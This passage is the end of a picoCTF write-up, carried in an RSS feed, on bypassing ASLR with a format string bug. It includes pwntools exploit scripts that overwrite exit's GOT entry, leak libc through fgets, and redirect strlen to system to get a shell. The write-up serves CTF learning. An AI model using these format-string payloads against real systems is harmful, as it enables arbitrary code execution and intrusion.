+payload += p64(EXIT_GOT)
+
+p.sendline(payload)
+
+p.interactive()
+
+</code></pre>
+<p><a href="https://asciinema.org/a/3o9igq8m5nvuv5hnwrm32etef" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/1/1e497babc090acd11e2ef4f89d6801be1a159aef.png" alt="asciicast"></a></p>
+<p>Looks like it worked! Well, almost. We just need to subtract 6 and we should be golden! Updated script:</p>
+<pre><code class="lang-python">#demo.py
+
+from pwn import *
+
+EXIT_GOT = 0x601258
+LOOP     = 0x4009bd
+
+p = process(['./console', 'log'])
+pause()
+
+payload  = "exit".ljust(8)
+payload += ("%%%du|%%17$hn|" % 2487).rjust(16)
+payload += p64(EXIT_GOT)
+
+p.sendline(payload)
+
+p.interactive()
+
+</code></pre>
+<p><a href="https://asciinema.org/a/9di551o5g5vnboa9czhgiom8u" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/2/26e4d78a850e4bbbda0656e8286c5133e9575da9.png" alt="asciicast"></a></p>
+<p>Boom! We successfully overwrote exit’s address with loop’s. So every time exit gets called, we will jump right back in the beginning and we will be able to enter a different format string, but this time to leak libc’s base address and more.</p>
+<hr>
+<p>##<span class="hashtag">#Leaking</span> Libc</p>
+<p>Time to move on with our plan. Leaking libc is not that hard. With a little bit of code we can resolve its base address in no time.</p>
+<pre><code class="lang-python">def leak(addr):
+    info("Leaking libc base address")
+
+    payload  = "exit".ljust(8)
+    payload += "|%17$s|".rjust(8)
+    payload += "blablala"
+    payload += p64(addr)
+
+    p.sendline(payload)
+    p.recvline()
+
+    data   = p.recvuntil("blablala")
+    fgets  = data.split('|')[1]
+    fgets  = hex(u64(fgets.ljust(8, "\x00")))
+
+    return fgets
+</code></pre>
+<p>I will not explain every technical aspect of the snippet since this is not a Python tutorial. This is what I tried to achieve overall:</p>
+<ul>
+<li>
+<p>The goal is to leak libc’s base address.</p>
+</li>
+<li>
+<p>We can accomplish that by leaking a libc’s function address. Fgets() in our case would be a wise choice since it’s already been resolved. In particular, I entered fgets’s GOT entry which contains the actual address.</p>
+</li>
+<li>
+<p>The %s specifier will treat the address we entered as a string of bytes. Meaning, it will try to read what’s <strong>IN</strong> the GOT entry.</p>
+</li>
+<li>
+<p>The output will be a stream of raw bytes.</p>
+</li>
+<li>
+<p>I used the u64() function to convert the raw bytes to an actual address.</p>
+</li>
+<li>
+<p>Once we find its address, we subtract its libc offset from it and we get the base address.</p>
+</li>
+</ul>
+<p>I made the exploit a little cleaner:</p>
+<pre><code class="lang-python">#demo.py
+
+from pwn import *
+import sys
+
+HOST = 'shell2017.picoctf.com'
+PORT = '47232'
+
+
+LOOP          = 0x4009bd
+STRLEN_GOT    = 0x601210
+EXIT_GOT      = 0x601258
+FGETS_GOT     = 0x601230
+FGETS_OFFSET  = 0x6dad0
+SYSTEM_OFFSET = 0x45390
+STRLEN_OFFSET = 0x8ab70
+
+def info(msg):
+    log.info(msg)
+
+def leak(addr):
+    info("Leaking libc base address")
+
+    payload  = "exit".ljust(8)
+    payload += "|%17$s|".rjust(8)
+    payload += "blablala"
+    payload += p64(addr)
+
+    p.sendline(payload)
+    p.recvline()
+
+    data   = p.recvuntil("blablala")
+    fgets  = data.split('|')[1]
+    fgets  = hex(u64(fgets.ljust(8, "\x00")))
+
+    return fgets
+
+def overwrite(addr, pad):
+    payload  = "exit".ljust(8)
+    payload += ("%%%du|%%17$hn|" % pad).rjust(16)
+    payload += p64(addr)
+
+    p.sendline(payload)
+    p.recvline()
+
+    return
+
+def exploit(p):
+    info("Overwriting exit with loop")
+
+    pad = (LOOP &amp; 0xffff) - 6
+    overwrite(EXIT_GOT, pad)
+
+    FGETS_LIBC  = leak(FGETS_GOT)
+    LIBC_BASE   = hex(int(FGETS_LIBC, 16) - FGETS_OFFSET)
+    SYSTEM_LIBC = hex(int(LIBC_BASE, 16) + SYSTEM_OFFSET)
+    STRLEN_LIBC = hex(int(LIBC_BASE, 16) + STRLEN_OFFSET)
+
+    info("system:   %s" % SYSTEM_LIBC)
+    info("strlen:   %s" % STRLEN_LIBC)
+    info("libc:     %s" % LIBC_BASE)
+
+    p.interactive()
+
+if __name__ == "__main__":
+    log.info("For remote: %s HOST PORT" % sys.argv[0])
+    if len(sys.argv) &gt; 1:
+        p = remote(sys.argv[1], int(sys.argv[2]))
+        exploit(p)
+    else:
+        p = process(['./console', 'log'])
+        pause()
+        exploit(p)
+</code></pre>
+<p>Just some notes on how to find the libc the binary uses and how to find the function offsets:</p>
+<pre><code class="lang-makefile">&gt; ldd console
+  [...]
+  libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6
+  [...]
+</code></pre>
+<pre><code class="lang-makefile">&gt; readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep fgets
+  [...]
+  753: 000000000006dad0   417 FUNC    WEAK   DEFAULT   13 fgets@@GLIBC_2.2.5
+  [...]
+</code></pre>
+<p>Let’s watch the magic happen:</p>
+<p><a href="https://asciinema.org/a/3vwznvpj2ms6x7322re2tbtgr" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/1/1589a983920f1057ad5971f46f460fcf956e1f02.png" alt="asciicast"></a></p>
+<p>As you can see, in every execution the libc’s base changes, aka ASLR. But that does not affect us anymore since we overwrote exit with loop().</p>
+<hr>
+<p>##<span class="hashtag">#Jumping</span> to system</p>
+<p>2/3 of our plan is successfully done. All that is left is redirecting code execution to system with the argument being <em>/bin/sh</em> or <em>sh</em> ofcourse.</p>
+<p>In case you didn’t notice, I purposely picked <strong>strlen</strong> as the victim. Why is that? Both <strong>system</strong> and <strong>strlen</strong> are invoked with one argument. Thus, once we overwrite <strong>strlen</strong> with <strong>system</strong>, <strong>system</strong> will read what is supposedly strlen’s argument and execute that command.</p>
+<p>Looks like we have to go back to step <span class="hashtag">#1</span> of our exploit. Meaning, we have to overwrite strlen’s libc address with system’s. Luckily for us, they share the same base address so practically we only have to overwrite the lower 4 bytes. For example, let’s use one of our script’s output.</p>
+<pre><code class="lang-makefile">             +-----------------------------+
+             |                             |
+0x7fb4|21ec|0b70| (strlen) =&gt; 0x7fb4|21e7|b390| (system)
+         |                            |
+         +----------------------------+
+           
+</code></pre>
+<p>This is how we can accomplish that:</p>
+<pre><code class="lang-python">    # subtract -7 at the end to get the correct offset
+    WRITELO =  int(hex(int(SYSTEM_LIBC, 16) &amp; 0xffff), 16) - 7
+    WRITEHI = int(hex((int(SYSTEM_LIBC, 16) &amp; 0xffff0000) &gt;&gt; 16), 16) - 7
+
+    # call prompt in order to resolve strlen's libc address.
+    p.sendline("prompt asdf")
+    p.recvline()
+
+    info("Overwriting strlen with system")
+    overwrite(STRLEN_GOT, WRITELO)
+    overwrite(STRLEN_GOT+2, WRITEHI)
+</code></pre>
+<p>The only part that deserves a bit of explanation is this one:</p>
+<pre><code class="lang-python">    overwrite(STRLEN_GOT, WRITELO)
+    overwrite(STRLEN_GOT+2, WRITEHI)
+</code></pre>
+<p>It seems like we overwrite the libc address via <strong>two short writes</strong>. It could be possible to do it with one but that would print a pretty big amount of padding bytes on the screen so with two writes is a bit cleaner. The concept is still the same. Let’s visualize it as well:</p>
+<pre><code class="lang-makefile">strlen GOT = 0x601210
+
+                    Global Offset Table
+                   +--------------------+
+                   |        ...         |
+                   +--------------------+
+                   |        ...         |    ...
+                   +--------------------+
+                   |        0x21        |   0x601213
+               /   +--------------------+
+ strlen + 0x2 |    |        0xec        |   0x601212
+               \   +--------------------+
+                   |        0x0b        |   0x601211
+                /  +--------------------+
+ strlen + 0x0  |   |        0x70        |   0x601210
+                \  +--------------------+
+</code></pre>
+<p>Now it should be more clear why and how we overwrite 2 bytes with each write. I’ll show you each write separately with GDB and then the full exploit. Because I’ll try to provide a view of both the exploit and GDB, the demos might be a bit slow because I’ll be jumping around the terminals. Stay with me.</p>
+<pre><code class="lang-makefile">overwrite(STRLEN_GOT, WRITELO)
+</code></pre>
+<p>Exploit (skip a few seconds):</p>
+<p><a href="https://asciinema.org/a/2sdayp9kec3e4nrat55hvlmsd" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/8/844cc0a7634e06e2a7a613ada30fffa27152c54c.png" alt="asciicast"></a></p>
+<p>GDB:</p>
+<p><a href="https://asciinema.org/a/88ik6kzzimu0t4qwxaf02qo5n" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/e/ebc5095097c82309cd8ee3b4addaf8bfd101b0aa.png" alt="asciicast"></a></p>
+<p>You might noticed that at some point in the exploit I typed “prompt asdf”. The reason I did that was to resolve strlen’s address since it’s the first time being called. I set a breakpoint in GDB at that point and stepped through the process. First time it went through the PLT stub code in order to resolve itself and once I typed <em>c</em>, its address was resolved and we overwrote its 2 lower bytes.</p>
+<pre><code class="lang-makefile">Before:
+system: 0x7fea06160390
+strlen: 0x7fea061a5b70
+
+After:
+strlen: 0x7fea06160397
+</code></pre>
+<p>The 2 lower bytes are 7 bytes off which is why in the exploit you saw the -7 subtraction. Sometimes it ended up being 5 or 6 bytes off, but it doesn’t matter. Just adjust the value to your needs. In your system it should be the same offset more or less.</p>
+<p>Let’s execute the exploit with both writes this times.</p>
+<p>Exploit (skip a few seconds):</p>
+<p><a href="https://asciinema.org/a/9ovrrps3bup4p2r6lanqvfis6" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/2/2a3c1f89047bc09d8a3a3666ed7f22776481a1ec.png" alt="asciicast"></a></p>
+<p>GDB:</p>
+<p><a href="https://asciinema.org/a/4sbeeahpxqjjcij8xv5hv3k7b" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/e/ea67e2ac28f1cefaeb009c75e85ac79f25a47b7d.png" alt="asciicast"></a></p>
+<pre><code class="lang-makefile">Before:
+system:   0x7fe7a273a390                                                                          
+strlen:   0x7fe7a277fb70
+
+After:
+strlen:   0x7fe7a273a390
+</code></pre>
+<p>Voila! We successfully overwrote strlen with system! Let’s fire up the exploit without GDB and get shivers.</p>
+<hr>
+<p>##<span class="hashtag">#PoC</span> Demo</p>
+<p><a href="https://asciinema.org/a/9rxph86dcsgvxrvtivadt8vgx" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/3/35ec3869bcc27dac17fb569e517312660a570255.png" alt="asciicast"></a></p>
+<hr>
+<p>##<span class="hashtag">#Conclusion</span></p>
+<p>That’s been it folks. I hope I didn’t waste your time. If you feel puzzled, don’t get discouraged, just re-read it a couple of times and research the same topic on google. After reading plenty of examples and implementing one of your own, you’ll be 1337. By the way, the task was a remote one, but the server was kinda slow when the CTF ended so I implemented it locally. The only change that you’d have to make is adjust the libc offsets, which is quite trivial since the libc was provided.</p>
+<p>Thank you for taking the time to read my write-up. Feedback is always welcome and much appreciated. If you have any questions, I’d love to help you out if I can. Finally, if you spot any errors in terms of code/syntax/grammar, please let me know. I’ll be looking out for mistakes as well.</p>
+<p>You can find my exploit and the binary (source code, libc included) <a href="https://github.com/0x0py/picoCTF" rel="noopener nofollow ugc">here</a>.</p>
+<p>Peace out,<br>
+<a class="mention" href="https://d.clarkee.co.uk/u/_py">@_py</a></p>
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920/1</link>
+        <pubDate>Sun, 23 Apr 2017 14:28:16 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1920-1</guid>
+        <source url="https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920.rss">picoCTF Write-up ~ Bypassing ASLR via Format String Bug</source>
+      </item>
+  </channel>
+</rss>
